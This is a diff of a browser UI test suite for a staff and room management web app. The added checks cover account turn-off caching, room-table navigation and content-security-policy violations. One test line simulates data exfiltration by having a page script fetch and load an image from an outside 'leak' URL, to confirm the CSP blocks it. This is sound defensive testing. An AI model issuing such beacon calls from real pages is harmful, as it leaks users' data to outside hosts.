@@ -1038,11 +1038,27 @@ async function runAtWidth(browser, BASE, width) {
     const s17Row = n => page.evaluate(n => { const r = [...document.querySelectorAll('#staff-tb tr')].find(x => x.textContent.includes(n)); return r ? { text: r.textContent, btns: [...r.querySelectorAll('button')].map(b => b.textContent.trim()) } : null; }, n);
     ok((await s17Row('ui163r_' + width)).btns.includes('Turn off'), `${tag} S17-1 each other account has "Turn off"`);
     ok(!(await page.evaluate(() => { const r = [...document.querySelectorAll('#staff-tb tr')].find(x => /You/.test(x.lastElementChild.textContent)); return r && [...r.querySelectorAll('button')].some(b => b.textContent.trim() === 'Turn off'); })), `${tag} S17-1 her own account has no "Turn off"`);
+    // Open a request sheet first, so its staff list is cached BEFORE the turn-off (review: stale cache)
+    const s17Req = await page.evaluate(() => apiFetch('/complaints').then(l => (l || []).find(c => !c.assigned_to) || (l || [])[0]));
+    ok(s17Req, `${tag} S17-1 (fixture) a request exists for the sheet check`);
+    await page.evaluate(id => requestSheet(id), s17Req.id);
+    await page.waitForSelector('#rq-assign', { timeout: 8000 });
+    ok(await page.$$eval('#rq-assign option', (os, n) => os.some(o => o.textContent.includes(n)), 'ui163r_' + width), `${tag} S17-1 before: the request sheet offers the account`);
+    await page.evaluate(() => closeModal());
     await page.evaluate(n => { const r = [...document.querySelectorAll('#staff-tb tr')].find(x => x.textContent.includes(n)); [...r.querySelectorAll('button')].find(b => b.textContent.trim() === 'Turn off').click(); }, 'ui163r_' + width);
     await page.waitForFunction(n => { const r = [...document.querySelectorAll('#staff-tb tr')].find(x => x.textContent.includes(n)); return r && /Turned off/.test(r.textContent); }, { timeout: 8000 }, 'ui163r_' + width);
     ok((await s17Row('ui163r_' + width)).btns.includes('Turn on'), `${tag} S17-1 a turned-off account shows "Turned off" and "Turn on"`);
     const s17Login = await page.evaluate(w => fetch('/api/auth/login', { method: 'POST', headers: { 'Content-Type': 'application/json', 'X-Forwarded-For': '192.0.2.201' }, body: JSON.stringify({ username: 'ui163r_' + w, password: 'Fresh-Pass-9' }) }).then(r => r.status), width);
     eq(s17Login, 403, `${tag} S17-1 turned off through the screen, it cannot log in`);
+    // …and the request sheet's "Assigned to" list no longer offers it (cache refreshed by Turn off)
+    {
+      await page.evaluate(id => requestSheet(id), s17Req.id);
+      await page.waitForSelector('#rq-assign', { timeout: 8000 });
+      ok(!(await page.$$eval('#rq-assign option', (os, n) => os.some(o => o.textContent.includes(n)), 'ui163r_' + width)), `${tag} S17-1 the request sheet does not offer a turned-off account`);
+      await page.evaluate(() => closeModal());
+      await page.evaluate(() => switchAdminTab('staff'));
+      await page.waitForFunction(n => [...document.querySelectorAll('#staff-tb tr')].some(r => r.textContent.includes(n)), { timeout: 8000 }, 'ui163r_' + width);
+    }
     await page.evaluate(n => { const r = [...document.querySelectorAll('#staff-tb tr')].find(x => x.textContent.includes(n)); [...r.querySelectorAll('button')].find(b => b.textContent.trim() === 'Turn on').click(); }, 'ui163r_' + width);
     await page.waitForFunction(n => { const r = [...document.querySelectorAll('#staff-tb tr')].find(x => x.textContent.includes(n)); return r && !/Turned off/.test(r.textContent); }, { timeout: 8000 }, 'ui163r_' + width);
     ok(true, `${tag} S17-1 "Turn on" brings it back`);
@@ -1164,7 +1180,20 @@ async function runAtWidth(browser, BASE, width) {
     eq(await roomCalls('rooms', 800), '1/0/rooms', `${tag} S17-3 on the Room map, a room change refreshes the map`);
     eq(await roomCalls('rooms-table', 800), '0/1/rooms-table', `${tag} S17-3 on the Rooms table, it refreshes the table`);
     eq(await roomCalls('dashboard', 1500), '0/0/dashboard', `${tag} S17-3 from another screen, it draws no room view over it`);
+    // The real path to the table: Room map → "Table" button (no navigate) → Edit → Save (review S17-3)
+    await page.evaluate(() => navigate('rooms')); await page.waitForSelector('.room-tile', { timeout: 8000 });
+    await page.evaluate(() => [...document.querySelectorAll('#page-content button')].find(b => b.textContent.trim() === 'Table').click());
+    await page.waitForFunction(() => document.querySelector('#page-content table') && !document.querySelector('.room-tile'), { timeout: 8000 });
+    await page.evaluate(r => roomModal(r), s17Room);
+    await page.waitForSelector('#modal-overlay .modal', { timeout: 5000 });
+    await page.evaluate(() => { window.__rc = { map: 0, table: 0 }; window.__oMap = pgRoomMap; window.__oTab = pgRooms;
+      pgRoomMap = (...a) => { window.__rc.map++; return window.__oMap(...a); }; pgRooms = (...a) => { window.__rc.table++; return window.__oTab(...a); }; });
+    await page.evaluate(() => [...document.querySelectorAll('#modal-overlay button')].find(b => b.textContent.trim() === 'Save').click());
+    await new Promise(r => setTimeout(r, 1800));
+    const rcT = await page.evaluate(() => { const r = window.__rc; pgRoomMap = window.__oMap; pgRooms = window.__oTab; return `${r.map}/${r.table}/${!!document.querySelector('#page-content table')}/${!!document.querySelector('.room-tile')}`; });
+    eq(rcT, '0/1/true/false', `${tag} S17-3 Map → Table button → Edit → Save stays on the table`);
     // S17-4: a script on the page cannot send anything to another site
+    eq(cspViolations.length, 0, `${tag} S17-4 no content-security-policy violation on any screen so far (${cspViolations.slice(0, 5).join('; ')})`);
     cspViolations.length = 0;
     await page.evaluate(() => { fetch('https://example.com/leak?t=1').catch(() => {}); const i = new Image(); i.src = 'https://example.com/leak.gif'; });
     await new Promise(r => setTimeout(r, 800));
